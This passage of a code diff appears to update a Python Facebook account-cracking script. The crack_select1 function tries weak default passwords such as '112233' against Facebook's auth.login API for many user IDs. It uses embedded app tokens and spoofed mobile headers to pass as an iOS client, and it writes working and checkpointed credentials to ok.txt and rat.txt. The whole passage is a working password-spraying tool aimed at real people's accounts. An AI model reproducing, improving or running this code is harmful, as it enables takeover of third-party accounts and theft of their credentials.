-																												if "www.facebook.com" in d['error_msg']:
+																												if "www.facebook.com" in data.json()['error_msg']:
 																													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
 																													cp = open("rat.txt", "a")
 																													cp.write(uid+"|"+pass13+"\n")
@@ -489,8 +534,10 @@ def crack_select1():
 																													cps.append(uid+pass13)
 																												else:
 																													pass14 = "112233"
-																													data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																													d = json.load(data)
+																													api = 'https://b-api.facebook.com/method/auth.login'
+																													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass14, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																													data = requests.get(api, params=params, headers=headers_)
 																													if "access_token" in data.text and "EAAA" in data.text:
 																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
 																														ok = open("ok.txt", "a")
@@ -498,7 +545,7 @@ def crack_select1():
 																														ok.close()
 																														oks.append(uid+pass14)
 																													else:
-																														if "www.facebook.com" in d['error_msg']:
+																														if "www.facebook.com" in data.json()['error_msg']:
 																															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
 																															cp = open("rat.txt", "a")
 																															cp.write(uid+"|"+pass14+"\n")
@@ -506,8 +553,10 @@ def crack_select1():
 																															cps.append(uid+pass14)
 																														else:
 																															pass15 = "123356789"
-																															data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-																															d = json.load(data)
+																															api = 'https://b-api.facebook.com/method/auth.login'
+																															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass15, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+																															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+																															data = requests.get(api, params=params, headers=headers_)
 																															if "access_token" in data.text and "EAAA" in data.text:
 																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
 																																ok = open("ok.txt", "a")
@@ -515,7 +564,7 @@ def crack_select1():
 																																ok.close()
 																																oks.append(uid+pass15)
 																															else:
-																																if "www.facebook.com" in d['error_msg']:
+																																if "www.facebook.com" in data.json()['error_msg']:
 																																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
 																																	cp = open("rat.txt", "a")
 																																	cp.write(uid+"|"+pass15+"\n")
